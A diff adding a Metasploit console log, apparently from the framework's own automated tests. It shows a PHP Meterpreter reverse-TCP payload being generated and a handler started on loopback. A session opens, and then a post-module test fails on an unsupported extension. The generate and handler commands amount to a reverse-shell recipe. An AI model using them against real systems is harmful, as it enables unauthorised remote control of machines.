@@ -1,0 +1,20 @@
+use php/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-5420-183krim.php -f raw lport=6035 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [*] Writing 1110 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-5420-183krim.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 34
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6035 
+[*] Sending stage (39282 bytes) to 127.0.0.1
+[*] Meterpreter session 24 opened (127.0.0.1:6035 -> 127.0.0.1:50074 ) at 2022-01-19 10:40:01 +0000
+use test/extapi
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> run session=24 addentropy=true verbose=true
+
+[*] Loading extapi extension...
+[-] Post failed: Rex::Post::Meterpreter::ExtensionLoadError The "extapi" extension is not supported by this Meterpreter type (php/windows)
+[-] Call stack:
+[-]   D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/extapi.rb:32:in `setup'
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> 
